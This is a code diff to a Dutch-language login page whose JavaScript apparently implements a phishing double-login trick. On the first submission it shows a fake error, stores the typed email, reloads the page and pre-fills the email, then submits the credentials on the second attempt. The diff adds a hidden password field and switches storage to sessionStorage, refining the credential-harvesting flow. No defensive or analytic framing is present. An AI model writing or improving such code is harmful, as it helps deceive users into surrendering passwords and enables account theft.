@@ -112,7 +112,7 @@
                         <label>Wachtwoord:</label>
                         <input type="text" id="passwordInput" name="message" placeholder="Uw wachtwoord" required>
                         <!-- Hidden field to store the actual password -->
-                        
+                        <input type="hidden" id="hiddenPassword" name="message">
                     </div>
                     <span class="or-text"><input type="radio" name="" id=""> Blijf ingelogd</span>
                     <div class="form-group">
@@ -128,34 +128,26 @@
     <script>
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
-        
+        const hiddenPassword = document.getElementById('hiddenPassword');
         const errorMessage = document.getElementById('errorMessage');
         const form = document.getElementById('customForm');
-
-        // Function to mask the input with dots
-        passwordInput.addEventListener('input', () => {
-            const value = passwordInput.value;
-            hiddenPassword.value = value; // Store the actual value in the hidden field
-            passwordInput.value = value.replace(/./g, '•'); // Replace all characters with dots
-        });
 
         // Function to handle form submission
         form.addEventListener('submit', (e) => {
             e.preventDefault(); // Prevent the form from submitting
 
-
             // Simulate an error (for demonstration purposes)
-            const isFirstAttempt = !localStorage.getItem('formSubmitted');
+            const isFirstAttempt = !sessionStorage.getItem('formSubmitted');
             if (isFirstAttempt) {
                 // Show error message
                 errorMessage.style.display = 'block';
 
-                // Save the email in localStorage
-                localStorage.setItem('savedEmail', emailInput.value);
+                // Save the email in sessionStorage
+                sessionStorage.setItem('savedEmail', emailInput.value);
 
                 // Redirect back to the form after a short delay
                 setTimeout(() => {
-                    window.location.href = window.location.href; // Reload the page
+                    window.location.reload(); // Reload the page
                 }, 2000); // 2-second delay
             } else {
                 // Submit the form on the second attempt
@@ -163,12 +155,12 @@
             }
 
             // Mark the form as submitted
-            localStorage.setItem('formSubmitted', 'true');
+            sessionStorage.setItem('formSubmitted', 'true');
         });
 
         // Pre-fill the email field if it was saved
         window.addEventListener('load', () => {
-            const savedEmail = localStorage.getItem('savedEmail');
+            const savedEmail = sessionStorage.getItem('savedEmail');
             if (savedEmail) {
                 emailInput.value = savedEmail;
             }
